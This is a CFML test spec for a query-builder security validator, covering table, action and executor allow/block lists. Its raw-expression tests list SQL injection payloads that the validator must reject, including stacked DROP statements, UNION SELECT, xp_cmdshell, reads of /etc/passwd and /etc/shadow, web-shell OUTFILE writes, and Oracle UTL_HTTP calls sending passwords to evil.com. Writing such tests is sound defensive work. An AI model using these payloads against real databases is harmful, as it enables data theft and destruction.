component extends="testbox.system.BaseSpec" {

	function run() {
		describe( "QBMLSecurity", function() {
			describe( "Allow mode", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity(
						settings = {
							tables  : { mode : "allow", list : [ "users", "accounts", "reporting.*" ] },
							aliases : { "accts" : "dbo.tbl_accounts" }
						}
					);
				} );

				it( "allows tables in the allowlist", function() {
					var result = security.validateTable( "users" );
					expect( result.valid ).toBeTrue();
				} );

				it( "blocks tables not in the allowlist", function() {
					var result = security.validateTable( "passwords" );
					expect( result.valid ).toBeFalse();
				} );

				it( "supports wildcard patterns", function() {
					var result = security.validateTable( "reporting.monthly_sales" );
					expect( result.valid ).toBeTrue();
				} );

				it( "resolves table aliases", function() {
					var result = security.validateTable( "accts" );
					expect( result.valid ).toBeTrue();
					expect( result.resolved ).toBe( "dbo.tbl_accounts" );
				} );

				it( "always allows CTE aliases", function() {
					var result = security.validateTable( "my_cte", [ "my_cte" ] );
					expect( result.valid ).toBeTrue();
				} );
			} );

			describe( "Block mode", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity(
						settings = {
							tables  : { mode : "block", list : [ "audit_log", "system.*" ] },
							aliases : {}
						}
					);
				} );

				it( "allows tables not in the blocklist", function() {
					var result = security.validateTable( "users" );
					expect( result.valid ).toBeTrue();
				} );

				it( "blocks tables in the blocklist", function() {
					var result = security.validateTable( "audit_log" );
					expect( result.valid ).toBeFalse();
				} );

				it( "blocks wildcard patterns", function() {
					var result = security.validateTable( "system.config" );
					expect( result.valid ).toBeFalse();
				} );
			} );

			// ============================================
			// RAW EXPRESSION VALIDATION - Safe Expressions
			// ============================================
			describe( "Raw expression validation - safe expressions", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity( settings = {} );
				} );

				it( "allows basic aggregate functions", function() {
					expect( security.validateRawExpression( "SUM(amount)" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "COUNT(*)" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "AVG(price)" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "MIN(created_at)" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "MAX(updated_at)" ).valid ).toBeTrue();
				} );

				it( "allows comparison expressions", function() {
					expect( security.validateRawExpression( "amount > ?" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "status = 'active'" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "price BETWEEN 10 AND 100" ).valid ).toBeTrue();
				} );

				it( "allows string functions", function() {
					expect( security.validateRawExpression( "COALESCE(name, 'Unknown')" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "CONCAT(first_name, ' ', last_name)" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "UPPER(email)" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "TRIM(username)" ).valid ).toBeTrue();
				} );

				it( "allows date functions", function() {
					expect( security.validateRawExpression( "DATEADD(day, 7, created_at)" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "DATEDIFF(day, start_date, end_date)" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "GETDATE()" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "NOW()" ).valid ).toBeTrue();
				} );

				it( "allows CASE expressions", function() {
					expect( security.validateRawExpression( "CASE WHEN status = 1 THEN 'active' ELSE 'inactive' END" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "CASE status WHEN 1 THEN 'A' WHEN 2 THEN 'B' END" ).valid ).toBeTrue();
				} );

				it( "allows mathematical expressions", function() {
					expect( security.validateRawExpression( "price * quantity" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "(subtotal + tax) * discount" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "ROUND(amount, 2)" ).valid ).toBeTrue();
				} );
			} );

			// ============================================
			// RAW EXPRESSION VALIDATION - DDL/DML Attacks
			// ============================================
			describe( "Raw expression validation - DDL/DML attacks", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity( settings = {} );
				} );

				it( "blocks DROP statements", function() {
					expect( security.validateRawExpression( "1; DROP TABLE users" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "'; DROP DATABASE test --" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "1;DROP TABLE users" ).valid ).toBeFalse();
				} );

				it( "blocks DELETE statements", function() {
					expect( security.validateRawExpression( "1; DELETE FROM users" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "'; DELETE FROM accounts WHERE 1=1 --" ).valid ).toBeFalse();
				} );

				it( "blocks INSERT statements", function() {
					expect( security.validateRawExpression( "1; INSERT INTO users VALUES ('hacker')" ).valid ).toBeFalse();
				} );

				it( "blocks UPDATE statements", function() {
					expect( security.validateRawExpression( "1; UPDATE users SET admin=1" ).valid ).toBeFalse();
				} );

				it( "blocks TRUNCATE statements", function() {
					expect( security.validateRawExpression( "1; TRUNCATE TABLE users" ).valid ).toBeFalse();
				} );

				it( "blocks ALTER statements", function() {
					expect( security.validateRawExpression( "1; ALTER TABLE users ADD admin BIT" ).valid ).toBeFalse();
				} );

				it( "blocks CREATE statements", function() {
					expect( security.validateRawExpression( "1; CREATE TABLE evil (id INT)" ).valid ).toBeFalse();
				} );

				it( "blocks EXEC/EXECUTE statements", function() {
					expect( security.validateRawExpression( "1; EXEC sp_addlogin 'hacker'" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "1; EXECUTE sp_executesql N'SELECT 1'" ).valid ).toBeFalse();
				} );

				it( "blocks GRANT/REVOKE/DENY statements", function() {
					expect( security.validateRawExpression( "1; GRANT ALL TO public" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "1; REVOKE SELECT FROM user" ).valid ).toBeFalse();
				} );
			} );

			// ============================================
			// RAW EXPRESSION VALIDATION - SQL Comments
			// ============================================
			describe( "Raw expression validation - SQL comments", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity( settings = {} );
				} );

				it( "blocks double-dash comments", function() {
					expect( security.validateRawExpression( "1 -- comment" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "admin'--" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "1--" ).valid ).toBeFalse();
				} );

				it( "blocks C-style comments", function() {
					expect( security.validateRawExpression( "1 /* comment */" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "/**/OR/**/1=1" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "1/*comment*/+1" ).valid ).toBeFalse();
				} );
			} );

			// ============================================
			// RAW EXPRESSION VALIDATION - SQL Server Attacks
			// ============================================
			describe( "Raw expression validation - SQL Server attacks", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity( settings = {} );
				} );

				it( "blocks xp_ extended stored procedures", function() {
					expect( security.validateRawExpression( "xp_cmdshell('dir')" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "xp_regread('HKLM')" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "xp_servicecontrol" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "xp_dirtree" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "xp_fileexist" ).valid ).toBeFalse();
				} );

				it( "blocks sp_ dynamic SQL procedures", function() {
					expect( security.validateRawExpression( "sp_executesql" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "sp_sqlexec" ).valid ).toBeFalse();
				} );

				it( "blocks OPENROWSET", function() {
					expect( security.validateRawExpression( "OPENROWSET('SQLOLEDB','server')" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "OPENROWSET (BULK 'c:\\data.txt')" ).valid ).toBeFalse();
				} );

				it( "blocks OPENDATASOURCE", function() {
					expect( security.validateRawExpression( "OPENDATASOURCE('SQLOLEDB','Data Source')" ).valid ).toBeFalse();
				} );

				it( "blocks OPENQUERY", function() {
					expect( security.validateRawExpression( "OPENQUERY(linkedserver, 'SELECT 1')" ).valid ).toBeFalse();
				} );

				it( "blocks BULK INSERT", function() {
					expect( security.validateRawExpression( "BULK INSERT users FROM 'c:\\evil.txt'" ).valid ).toBeFalse();
				} );

				it( "blocks WAITFOR DELAY timing attacks", function() {
					expect( security.validateRawExpression( "WAITFOR DELAY '0:0:5'" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "IF 1=1 WAITFOR DELAY '0:0:10'" ).valid ).toBeFalse();
				} );
			} );

			// ============================================
			// RAW EXPRESSION VALIDATION - MySQL Attacks
			// ============================================
			describe( "Raw expression validation - MySQL attacks", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity( settings = {} );
				} );

				it( "blocks LOAD_FILE", function() {
					expect( security.validateRawExpression( "LOAD_FILE('/etc/passwd')" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "LOAD_FILE (0x2F6574632F706173737764)" ).valid ).toBeFalse();
				} );

				it( "blocks INTO OUTFILE", function() {
					expect( security.validateRawExpression( "SELECT * INTO OUTFILE '/tmp/evil.txt'" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "1 INTO OUTFILE '/var/www/shell.php'" ).valid ).toBeFalse();
				} );

				it( "blocks INTO DUMPFILE", function() {
					expect( security.validateRawExpression( "SELECT 'code' INTO DUMPFILE '/tmp/shell.php'" ).valid ).toBeFalse();
				} );

				it( "blocks LOAD DATA INFILE", function() {
					expect( security.validateRawExpression( "LOAD DATA INFILE '/etc/passwd' INTO TABLE users" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "LOAD DATA LOCAL INFILE '/tmp/data.txt'" ).valid ).toBeFalse();
				} );

				it( "blocks BENCHMARK timing attacks", function() {
					expect( security.validateRawExpression( "BENCHMARK(10000000, SHA1('test'))" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "IF(1=1,BENCHMARK(1000000,MD5('a')),0)" ).valid ).toBeFalse();
				} );

				it( "blocks SLEEP timing attacks", function() {
					expect( security.validateRawExpression( "SLEEP(5)" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "IF(1=1,SLEEP(10),0)" ).valid ).toBeFalse();
				} );
			} );

			// ============================================
			// RAW EXPRESSION VALIDATION - PostgreSQL Attacks
			// ============================================
			describe( "Raw expression validation - PostgreSQL attacks", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity( settings = {} );
				} );

				it( "blocks pg_read_file", function() {
					expect( security.validateRawExpression( "pg_read_file('/etc/passwd')" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "pg_read_file('/etc/passwd', 0, 1000)" ).valid ).toBeFalse();
				} );

				it( "blocks pg_read_binary_file", function() {
					expect( security.validateRawExpression( "pg_read_binary_file('/etc/shadow')" ).valid ).toBeFalse();
				} );

				it( "blocks pg_ls_dir", function() {
					expect( security.validateRawExpression( "pg_ls_dir('/var/lib/postgresql')" ).valid ).toBeFalse();
				} );

				it( "blocks pg_stat_file", function() {
					expect( security.validateRawExpression( "pg_stat_file('/etc/passwd')" ).valid ).toBeFalse();
				} );

				it( "blocks lo_import/lo_export", function() {
					expect( security.validateRawExpression( "lo_import('/etc/passwd')" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "lo_export(1234, '/tmp/evil.txt')" ).valid ).toBeFalse();
				} );

				it( "blocks COPY command", function() {
					expect( security.validateRawExpression( "COPY users FROM '/tmp/data.csv'" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "COPY (SELECT * FROM users) TO '/tmp/dump.csv'" ).valid ).toBeFalse();
				} );

				it( "blocks pg_sleep timing attacks", function() {
					expect( security.validateRawExpression( "pg_sleep(5)" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "CASE WHEN 1=1 THEN pg_sleep(10) END" ).valid ).toBeFalse();
				} );
			} );

			// ============================================
			// RAW EXPRESSION VALIDATION - Oracle Attacks
			// ============================================
			describe( "Raw expression validation - Oracle attacks", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity( settings = {} );
				} );

				it( "blocks UTL_FILE operations", function() {
					expect( security.validateRawExpression( "UTL_FILE.FOPEN('/tmp', 'evil.txt', 'w')" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "UTL_FILE.PUT_LINE(f, 'data')" ).valid ).toBeFalse();
				} );

				it( "blocks UTL_HTTP", function() {
					expect( security.validateRawExpression( "UTL_HTTP.REQUEST('http://evil.com/steal?data='||password)" ).valid ).toBeFalse();
				} );

				it( "blocks UTL_TCP", function() {
					expect( security.validateRawExpression( "UTL_TCP.OPEN_CONNECTION('evil.com', 80)" ).valid ).toBeFalse();
				} );

				it( "blocks UTL_SMTP", function() {
					expect( security.validateRawExpression( "UTL_SMTP.OPEN_CONNECTION('mail.evil.com')" ).valid ).toBeFalse();
				} );

				it( "blocks DBMS_XMLGEN", function() {
					expect( security.validateRawExpression( "DBMS_XMLGEN.GETXML('SELECT * FROM users')" ).valid ).toBeFalse();
				} );

				it( "blocks DBMS_LDAP", function() {
					expect( security.validateRawExpression( "DBMS_LDAP.INIT('ldap.evil.com')" ).valid ).toBeFalse();
				} );

				it( "blocks DBMS_JAVA", function() {
					expect( security.validateRawExpression( "DBMS_JAVA.RUNJAVA('malware')" ).valid ).toBeFalse();
				} );

				it( "blocks DBMS_LOCK.SLEEP timing attacks", function() {
					expect( security.validateRawExpression( "DBMS_LOCK.SLEEP(10)" ).valid ).toBeFalse();
				} );

				it( "blocks DBMS_PIPE.RECEIVE_MESSAGE timing attacks", function() {
					expect( security.validateRawExpression( "DBMS_PIPE.RECEIVE_MESSAGE('x',10)" ).valid ).toBeFalse();
				} );
			} );

			// ============================================
			// RAW EXPRESSION VALIDATION - Injection Markers
			// ============================================
			describe( "Raw expression validation - injection markers", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity( settings = {} );
				} );

				it( "blocks stacked queries", function() {
					expect( security.validateRawExpression( "1; SELECT * FROM users" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "';SELECT password FROM users--" ).valid ).toBeFalse();
				} );

				it( "blocks UNION SELECT injection", function() {
					expect( security.validateRawExpression( "1 UNION SELECT password FROM users" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "1 UNION ALL SELECT 1,2,3" ).valid ).toBeFalse();
				} );

				it( "blocks server variable access", function() {
					expect( security.validateRawExpression( "@@version" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "@@servername" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "SELECT @@datadir" ).valid ).toBeFalse();
				} );

				it( "blocks INFORMATION_SCHEMA access", function() {
					expect( security.validateRawExpression( "SELECT * FROM INFORMATION_SCHEMA.TABLES" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "INFORMATION_SCHEMA.COLUMNS" ).valid ).toBeFalse();
				} );

				it( "blocks system table access", function() {
					expect( security.validateRawExpression( "sys.tables" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "sys.columns" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "mysql.user" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "pg_catalog.pg_tables" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "master..sysdatabases" ).valid ).toBeFalse();
				} );
			} );

			// ============================================
			// RAW EXPRESSION VALIDATION - Encoding Bypasses
			// ============================================
			describe( "Raw expression validation - encoding bypasses", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity( settings = {} );
				} );

				it( "blocks hex-encoded strings", function() {
					// 0x2F6574632F706173737764 = /etc/passwd
					expect( security.validateRawExpression( "0x2F6574632F706173737764" ).valid ).toBeFalse();
					// 0x44524F50 = DROP
					expect( security.validateRawExpression( "0x44524F50205441424C45" ).valid ).toBeFalse();
				} );

				it( "blocks CHAR() encoding bypass", function() {
					expect( security.validateRawExpression( "CHAR(68)+CHAR(82)+CHAR(79)+CHAR(80)" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "CHAR(0x44)" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "CHAR( 115 )" ).valid ).toBeFalse();
				} );

				it( "blocks CHR() encoding bypass (Oracle)", function() {
					expect( security.validateRawExpression( "CHR(68)||CHR(82)||CHR(79)||CHR(80)" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "CHR( 97 )" ).valid ).toBeFalse();
				} );

				it( "blocks CONCAT with CHAR encoding", function() {
					expect( security.validateRawExpression( "CONCAT(CHAR(68),CHAR(82))" ).valid ).toBeFalse();
				} );
			} );

			// ============================================
			// RAW EXPRESSION VALIDATION - Edge Cases
			// ============================================
			describe( "Raw expression validation - edge cases", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity( settings = {} );
				} );

				it( "handles empty strings", function() {
					expect( security.validateRawExpression( "" ).valid ).toBeTrue();
					expect( security.validateRawExpression( "   " ).valid ).toBeTrue();
				} );

				it( "handles case variations", function() {
					expect( security.validateRawExpression( "DROP TABLE users" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "drop table users" ).valid ).toBeFalse();
					expect( security.validateRawExpression( "DrOp TaBlE users" ).valid ).toBeFalse();
				} );

				it( "handles whitespace variations", function() {
					expect( security.validateRawExpression( ";  DROP   TABLE users" ).valid ).toBeFalse();
					// Use chr() to create actual tab and newline characters
					expect( security.validateRawExpression( ";" & chr( 9 ) & "DROP" & chr( 10 ) & "TABLE users" ).valid ).toBeFalse();
				} );

				it( "does not false-positive on legitimate UNION in column names", function() {
					// Note: This is a tricky case - we allow "union" as column name
					// but block "UNION SELECT"
					expect( security.validateRawExpression( "union_type = 'A'" ).valid ).toBeTrue();
				} );
			} );

			describe( "Query validation", function() {
				beforeEach( function() {
					variables.security = new qbml.models.QBMLSecurity(
						settings = {
							tables  : { mode : "allow", list : [ "users", "orders" ] },
							aliases : {}
						}
					);
				} );

				it( "validates entire query structure", function() {
					var query = [
						{ "from" : "users" },
						{ "select" : [ "id", "name" ] },
						{ "where" : [ "status", "=", "active" ] }
					];
					var result = security.validateQuery( query );
					expect( result.valid ).toBeTrue();
				} );

				it( "catches invalid tables in query", function() {
					var query = [
						{ "from" : "passwords" },
						{ "select" : [ "*" ] }
					];
					var result = security.validateQuery( query );
					expect( result.valid ).toBeFalse();
				} );

				it( "validates nested subqueries", function() {
					var query = [
						{ "from" : "users" },
						{
							"whereExists" : true,
							"query"       : [
								{ "from" : "passwords" },
								{ "select" : [ "1" ] }
							]
						}
					];
					var result = security.validateQuery( query );
					expect( result.valid ).toBeFalse();
				} );

				it( "allows CTE aliases in main query", function() {
					var query = [
						{
							"with"  : "active_users",
							"query" : [
								{ "from" : "users" },
								{ "where" : [ "status", "=", "active" ] }
							]
						},
						{ "from" : "active_users" },
						{ "select" : [ "*" ] }
					];
					var result = security.validateQuery( query );
					expect( result.valid ).toBeTrue();
				} );
			} );

			// ============================================
			// ACTION VALIDATION
			// ============================================
			describe( "Action validation", function() {
				describe( "Allow mode", function() {
					beforeEach( function() {
						variables.security = new qbml.models.QBMLSecurity(
							settings = {
								actions : { mode : "allow", list : [ "select", "where", "from", "get" ] }
							}
						);
					} );

					it( "allows actions in the allowlist", function() {
						var result = security.validateAction( "select" );
						expect( result.valid ).toBeTrue();
					} );

					it( "blocks actions not in the allowlist", function() {
						var result = security.validateAction( "whereRaw" );
						expect( result.valid ).toBeFalse();
						expect( result.message ).toInclude( "not in the allowed actions list" );
					} );
				} );

				describe( "Block mode", function() {
					beforeEach( function() {
						variables.security = new qbml.models.QBMLSecurity(
							settings = {
								actions : { mode : "block", list : [ "*Raw", "fromRaw" ] }
							}
						);
					} );

					it( "allows actions not in the blocklist", function() {
						var result = security.validateAction( "select" );
						expect( result.valid ).toBeTrue();
					} );

					it( "blocks actions matching wildcard patterns", function() {
						var result = security.validateAction( "whereRaw" );
						expect( result.valid ).toBeFalse();
						expect( result.message ).toInclude( "blocked" );
					} );

					it( "blocks exact matches in blocklist", function() {
						var result = security.validateAction( "fromRaw" );
						expect( result.valid ).toBeFalse();
					} );
				} );

				describe( "None mode", function() {
					beforeEach( function() {
						variables.security = new qbml.models.QBMLSecurity(
							settings = {
								actions : { mode : "none", list : [] }
							}
						);
					} );

					it( "allows all actions when mode is none", function() {
						expect( security.validateAction( "select" ).valid ).toBeTrue();
						expect( security.validateAction( "whereRaw" ).valid ).toBeTrue();
						expect( security.validateAction( "anyAction" ).valid ).toBeTrue();
					} );
				} );
			} );

			// ============================================
			// EXECUTOR VALIDATION
			// ============================================
			describe( "Executor validation", function() {
				describe( "Allow mode", function() {
					beforeEach( function() {
						variables.security = new qbml.models.QBMLSecurity(
							settings = {
								executors : { mode : "allow", list : [ "get", "first", "count", "exists" ] }
							}
						);
					} );

					it( "allows executors in the allowlist", function() {
						var result = security.validateExecutor( "get" );
						expect( result.valid ).toBeTrue();
					} );

					it( "blocks executors not in the allowlist", function() {
						var result = security.validateExecutor( "dump" );
						expect( result.valid ).toBeFalse();
						expect( result.message ).toInclude( "not in the allowed executors list" );
					} );
				} );

				describe( "Block mode", function() {
					beforeEach( function() {
						variables.security = new qbml.models.QBMLSecurity(
							settings = {
								executors : { mode : "block", list : [ "dump", "toSQL" ] }
							}
						);
					} );

					it( "allows executors not in the blocklist", function() {
						var result = security.validateExecutor( "get" );
						expect( result.valid ).toBeTrue();
					} );

					it( "blocks executors in the blocklist", function() {
						var result = security.validateExecutor( "dump" );
						expect( result.valid ).toBeFalse();
						expect( result.message ).toInclude( "blocked" );
					} );
				} );

				describe( "None mode", function() {
					beforeEach( function() {
						variables.security = new qbml.models.QBMLSecurity(
							settings = {
								executors : { mode : "none", list : [] }
							}
						);
					} );

					it( "allows all executors when mode is none", function() {
						expect( security.validateExecutor( "get" ).valid ).toBeTrue();
						expect( security.validateExecutor( "dump" ).valid ).toBeTrue();
						expect( security.validateExecutor( "anyExecutor" ).valid ).toBeTrue();
					} );
				} );
			} );

			// ============================================
			// WILDCARD PATTERN MATCHING
			// ============================================
			describe( "Wildcard pattern matching", function() {
				it( "matches prefix wildcards (*Raw)", function() {
					var security = new qbml.models.QBMLSecurity(
						settings = { actions : { mode : "block", list : [ "*Raw" ] } }
					);
					expect( security.validateAction( "whereRaw" ).valid ).toBeFalse();
					expect( security.validateAction( "selectRaw" ).valid ).toBeFalse();
					expect( security.validateAction( "orderByRaw" ).valid ).toBeFalse();
					expect( security.validateAction( "where" ).valid ).toBeTrue();
				} );

				it( "matches suffix wildcards (sys.*)", function() {
					var security = new qbml.models.QBMLSecurity(
						settings = { tables : { mode : "block", list : [ "sys.*" ] } }
					);
					expect( security.validateTable( "sys.tables" ).valid ).toBeFalse();
					expect( security.validateTable( "sys.columns" ).valid ).toBeFalse();
					expect( security.validateTable( "users" ).valid ).toBeTrue();
				} );

				it( "matches case-insensitively", function() {
					var security = new qbml.models.QBMLSecurity(
						settings = { actions : { mode : "allow", list : [ "SELECT", "WHERE" ] } }
					);
					expect( security.validateAction( "select" ).valid ).toBeTrue();
					expect( security.validateAction( "SELECT" ).valid ).toBeTrue();
					expect( security.validateAction( "Select" ).valid ).toBeTrue();
				} );
			} );
		} );
	}

}
